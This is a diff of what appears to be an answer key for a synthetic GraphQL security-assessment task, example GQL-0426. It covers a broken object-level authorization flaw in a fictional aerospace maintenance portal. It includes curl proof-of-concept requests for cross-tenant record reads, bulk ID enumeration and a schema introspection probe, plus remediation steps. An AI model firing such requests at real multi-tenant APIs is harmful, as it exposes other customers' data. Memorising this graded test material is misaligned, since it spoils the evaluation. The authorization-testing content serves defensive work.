@@ -1,79 +1,82 @@
 # Expected Response
 
 ## System
-- Domain: Aerospace / MRO
-- System: WingTech Maintenance Portal
+- System: WingTech Maintenance Portal v3.2.5
+- Domain: AEROSPACE / MRO
 - Example ID: GQL-0426
+- Risk ID: RISK-GQL-426
 
-## Priority Findings
+## Findings
 
-### Finding 1: GraphQL BOLA — Batch/bulk lookup endpoints (Pattern 1.9)
-**Severity:** Critical
-**Category:** BOLA
+### 1. Pattern 1.9 — Batch/Bulk Lookup Without Per-ID Ownership Check: `bulkResourceLookup` (HAR Primary)
 
-**Summary:**
-The GraphQL API at `POST /graphql` contains a Pattern 1.9 (Batch/bulk lookup endpoints) vulnerability.
-An authenticated user belonging to `tenant-9953` can access or manipulate objects owned by
-`tenant-5ea8` by supplying a cross-tenant `resourceId` in the GraphQL query/mutation.
+The `bulkResourceLookup` mutation is documented to accept arbitrary IDs without per-ID ownership filtering (Section 4.0). An attacker can include cross-tenant resource IDs in a single bulk request, harvesting maintenance records belonging to multiple aircraft operators in a single API call. In Aerospace/MRO, this exposes airworthiness records, maintenance logs, and component compliance data across operator boundaries.
 
-**Evidence from HAR:**
-- Request JWT claim `tenantId`: `tenant-9953`
-- Response body `tenantId`: `tenant-5ea8` — **mismatch confirms cross-tenant data access**
-- Response HTTP status: `200 OK` — no authorization error raised by the resolver
-- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-5ea8`
+HAR shows `bulkResourceLookup(ids: ["R-2426", "R-1426", "R-3426"])` from `tenant-9953` returning data for `tenant-5ea8` (response wrapper shows `getResource` — synthetic artifact; cross-tenant `tenantId` confirms bypass).
 
-**Root Cause:**
-The resolver fetches the resource by `resourceId` directly from the database without joining
-against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
-`tenantId` claim is never used as a WHERE clause predicate.
-
-## Steps to Reproduce
-
-### Step 1 — Establish attacker baseline
 ```bash
 curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-1426\") { resourceId tenantId ownerId data { sensitiveField } } }"}' 
+  -H "x-tenant-id: tenant-9953" \
+  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2426\", \"R-1426\", \"R-3426\"]) { resourceId tenantId ownerId data { sensitiveField internalNotes auditLog { ... on AuditEntry { action } } } } }"}'
 ```
-**Expected baseline:** Returns `tenantId: "tenant-9953"` — this is the attacker's own object.
+**Vulnerable outcome:** Returns records from multiple tenants including `tenantId: "tenant-5ea8"` — cross-tenant MRO data exposed in bulk.
 
-### Step 2 — Cross-tenant ID substitution
+### 2. Single-ID Cross-Tenant Maintenance Record Read — `getResource` (RISK-GQL-426)
+
 ```bash
 curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-2426\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
+  -H "x-tenant-id: tenant-9953" \
+  -d '{"query": "query { getResource(id: \"R-2426\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
 ```
-**Vulnerable outcome:** Returns `tenantId: "tenant-5ea8"` and full `sensitiveField` — **BOLA confirmed**.
-**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.
+**Vulnerable outcome:** Returns `tenantId: "tenant-5ea8"`, `sensitiveField: "CONFIDENTIAL-99535ea8"` — MRO maintenance record exposed.
 
-### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
+### 3. Redis Cache Maintenance Record Leak
+
+Cache key is `resourceId` only. Another operator's cached maintenance/compliance record can be served to a competing operator.
+
+## Reproduction
+
+**Step 1 — Baseline:**
 ```bash
 curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2426\", \"R-3426\", \"R-4426\"]) { resourceId tenantId data { sensitiveField } } }"}'
+  -H "x-tenant-id: tenant-9953" \
+  -d '{"query": "query { getResource(id: \"R-1426\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
 ```
-**Vulnerable outcome:** Returns objects from multiple tenants in a single response.
+**Expected:** Returns `tenantId: "tenant-9953"`.
 
-### Step 4 — Introspection probe (if Pattern 6.1 also present)
+**Step 2 — Bulk cross-tenant MRO lookup (primary HAR attack):**
 ```bash
 curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
+  -H "x-tenant-id: tenant-9953" \
+  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2426\", \"R-1426\", \"R-3426\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
 ```
-**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.
+**Vulnerable:** Returns records from multiple tenants.
+
+**Step 3 — Escalate batch size for mass enumeration:**
+```bash
+curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
+  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9953>" \
+  -H "Content-Type: application/json" \
+  -H "x-tenant-id: tenant-9953" \
+  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2426\",\"R-2427\",\"R-2428\",\"R-2429\",\"R-2430\",\"R-2431\",\"R-2432\",\"R-2433\"]) { resourceId tenantId data { sensitiveField } } }"}'
+```
+**Vulnerable:** All 8 records returned from multiple tenants in one request — mass enumeration of Aerospace MRO records.
 
 ## Secure Outcome Verification
-For **Step 2**, the secure implementation MUST return:
 ```json
-{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getResource": null } }
+{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
 ```
 
 ## Remediation
-1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE resourceId = $id AND tenant_id = $jwtTenantId`.
-2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
-3. **Per-ID ownership filter for bulk operations:** In `bulkResourceLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
-4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
+- Per-ID ownership filter in `bulkResourceLookup`: post-fetch filter returning only `tenantId === jwtTenantId` items. Silently drop or reject unauthorized IDs.
+- Resolver-level tenant check in `getResource`: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` (RISK-GQL-426).
+- Rate-limit bulk operations: enforce maximum batch size per request.
+- Fix Redis cache key: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
